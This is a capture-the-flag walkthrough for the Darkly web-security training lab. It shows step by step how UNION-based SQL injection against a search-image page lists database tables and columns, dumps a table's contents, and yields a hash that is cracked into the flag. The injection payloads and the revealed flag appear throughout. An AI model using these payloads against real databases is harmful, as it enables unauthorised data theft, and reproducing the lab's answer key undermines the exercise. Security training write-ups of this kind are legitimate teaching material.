Second flag of Darkly guys are we excited or what!

Step 1.) Where to find the flag
http://192.168.1.100/index.php?page=searchimg

Step 2.) Now that we are on the page here we can try for simple sql Injection by passing 1 , 1=1 or even passing 1 or 1 = 1
In doing this we see that data is being returned from the database so we try to get data from the tables in the database using SQL injection

Step 3.) Same as the prev flag we are going to try and get table name of the table here
''
-1  UNION SELECT  table_name, 1 FROM information_schema.tables where table_schema = database() 
''

here we got back 'list_images'

Step 4.) There after we are going to get the columns again too
''
-1  UNION SELECT  column_name, 1 FROM information_schema.columns where table_schema = database() 
''

in our results we found this

ID: -1 union select null, concat (id, url, title, comment) from list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 



when we decode the given data we get the following string --> albatroz

sha 256 calculator result after passing in albatroz -->   f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Well done you have found the second flag!
